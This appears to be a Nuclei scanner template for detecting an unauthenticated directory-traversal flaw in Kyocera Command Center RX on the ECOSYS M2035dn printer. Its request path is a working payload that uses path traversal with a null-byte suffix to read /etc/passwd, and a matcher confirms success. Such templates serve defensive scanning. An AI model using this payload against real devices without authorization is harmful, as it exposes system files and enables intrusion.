id: kyocera-rx-ecosys-m2035dn-lfi
info:
  author: 0x_Akoko
  description: Kyocera Command Center RX ECOSYS M2035dn - Directory Traversal File
    Disclosure (Unauthenticated)
  name: Kyocera Command Center RX ECOSYS M2035dn - Directory Traversal File Disclosure
    (Unauthenticated)
  reference:
  - https://www.exploit-db.com/exploits/50738
  - https://www.kyoceradocumentsolutions.com/asia/en/products/business-application/command-center-rx.html
  requests:
  - matchers:
    - regex:
      - root:[x*]:0:0
      type: regex
    - status:
      - 200
      type: status
    matchers-condition: and
    method: GET
    path:
    - '{{BaseURL}}/js/../../../../../../../../etc/passwd%00.jpg'
  severity: high
  tags: printer,iot,kyocera,lfi
